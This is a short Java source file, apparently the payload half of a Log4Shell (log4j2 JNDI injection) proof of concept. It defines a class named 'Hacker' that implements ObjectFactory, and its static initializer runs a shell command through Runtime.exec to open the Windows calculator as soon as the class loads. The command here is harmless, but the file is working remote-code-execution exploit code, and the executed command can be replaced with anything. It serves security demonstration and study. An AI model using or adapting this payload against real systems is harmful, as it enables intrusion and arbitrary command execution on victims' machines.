package com.itplh.log4j2;

import javax.naming.Context;
import javax.naming.Name;
import javax.naming.spi.ObjectFactory;
import java.io.IOException;
import java.util.Hashtable;

public class Hacker implements ObjectFactory {

    static {
        System.out.println("hacker look一下，然后打开了计算器");
        try {
            Runtime.getRuntime().exec("C:/Windows/System32/cmd.exe /c calc");
        } catch (IOException e) {
            e.printStackTrace();
        }
    }

    @Override
    public Object getObjectInstance(Object obj, Name name, Context nameCtx, Hashtable<?, ?> environment) throws Exception {
        return null;
    }
}
